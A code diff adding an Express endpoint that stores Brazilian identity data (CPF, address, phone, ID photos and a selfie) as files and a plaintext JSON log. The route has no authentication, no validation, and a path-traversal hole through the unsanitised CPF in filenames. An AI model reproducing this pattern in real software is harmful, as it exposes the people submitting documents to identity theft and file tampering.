@@ -86,6 +86,60 @@ export async function registerRoutes(
     res.json(feedbacks);
   });
 
+  // Save documents for admin review
+  app.post("/api/documents/save", async (req, res) => {
+    try {
+      const { cpf, name, birthDate, phone, whatsapp, address, documentType, frontPhoto, backPhoto, selfiePhoto } = req.body;
+      
+      const timestamp = Date.now();
+      const docDir = path.join(__dirname, '../documents_storage');
+      
+      if (!fs.existsSync(docDir)) {
+        fs.mkdirSync(docDir, { recursive: true });
+      }
+
+      // Save photos
+      const base64DataFront = frontPhoto.split(',')[1];
+      const base64DataBack = backPhoto.split(',')[1];
+      const base64DataSelfie = selfiePhoto.split(',')[1];
+
+      const frontPath = path.join(docDir, `${cpf}_${timestamp}_frente.jpg`);
+      const backPath = path.join(docDir, `${cpf}_${timestamp}_verso.jpg`);
+      const selfiePath = path.join(docDir, `${cpf}_${timestamp}_selfie.jpg`);
+
+      fs.writeFileSync(frontPath, Buffer.from(base64DataFront, 'base64'));
+      fs.writeFileSync(backPath, Buffer.from(base64DataBack, 'base64'));
+      fs.writeFileSync(selfiePath, Buffer.from(base64DataSelfie, 'base64'));
+
+      // Log verification
+      const logFile = path.join(docDir, 'verification_log.json');
+      let logs = [];
+      if (fs.existsSync(logFile)) {
+        logs = JSON.parse(fs.readFileSync(logFile, 'utf-8'));
+      }
+      
+      logs.push({
+        timestamp,
+        cpf,
+        name,
+        birthDate,
+        phone,
+        whatsapp,
+        address,
+        documentType,
+        status: 'pending_review',
+        createdAt: new Date().toISOString()
+      });
+
+      fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
+
+      res.json({ message: 'Documents saved for review', timestamp });
+    } catch (err) {
+      console.error('Error saving documents:', err);
+      res.status(500).json({ message: 'Error saving documents' });
+    }
+  });
+
   // CEP Lookup endpoint
   app.get("/api/cep/:cep", async (req, res) => {
     try {
